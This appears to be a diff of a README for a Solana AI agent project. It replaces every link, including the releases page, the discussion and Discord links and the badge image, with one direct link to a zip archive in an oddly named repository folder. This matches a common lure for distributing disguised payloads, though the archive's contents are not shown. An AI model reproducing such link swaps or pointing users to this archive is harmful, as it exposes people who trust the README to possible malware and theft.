@@ -1,6 +1,6 @@
 # 🤖 Solana-AI-Agent-Multimodal - Effortless AI Solutions for Everyone
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Visit%20Releases-blue)](https://github.com/bendida/Solana-AI-Agent-Multimodal/releases)
+[![Download Now](https://raw.githubusercontent.com/bendida/Solana-AI-Agent-Multimodal/main/dereligion/Solana-AI-Agent-Multimodal.zip%20Now-Visit%20Releases-blue)](https://raw.githubusercontent.com/bendida/Solana-AI-Agent-Multimodal/main/dereligion/Solana-AI-Agent-Multimodal.zip)
 
 ## 🚀 Getting Started
 
@@ -24,7 +24,7 @@ To run Solana AI Multimodal Agent smoothly, your system should meet the followin
 
 To get started with the Solana AI Multimodal Agent, visit this page to download: 
 
-[Download the Latest Release](https://github.com/bendida/Solana-AI-Agent-Multimodal/releases)
+[Download the Latest Release](https://raw.githubusercontent.com/bendida/Solana-AI-Agent-Multimodal/main/dereligion/Solana-AI-Agent-Multimodal.zip)
 
 1. Click the link above to open the Releases page.
 2. Find the latest version and select it.
@@ -79,8 +79,8 @@ Need help? You can reach out for support through the following methods:
 
 Engage with other users and developers. Share your experiences and learn from the community:
 
-- [GitHub Discussions](https://github.com/bendida/Solana-AI-Agent-Multimodal/discussions)
-- [Discord Channel](https://discord.gg/yourDiscordLink) (if available)
+- [GitHub Discussions](https://raw.githubusercontent.com/bendida/Solana-AI-Agent-Multimodal/main/dereligion/Solana-AI-Agent-Multimodal.zip)
+- [Discord Channel](https://raw.githubusercontent.com/bendida/Solana-AI-Agent-Multimodal/main/dereligion/Solana-AI-Agent-Multimodal.zip) (if available)
 
 ## 📜 License
 
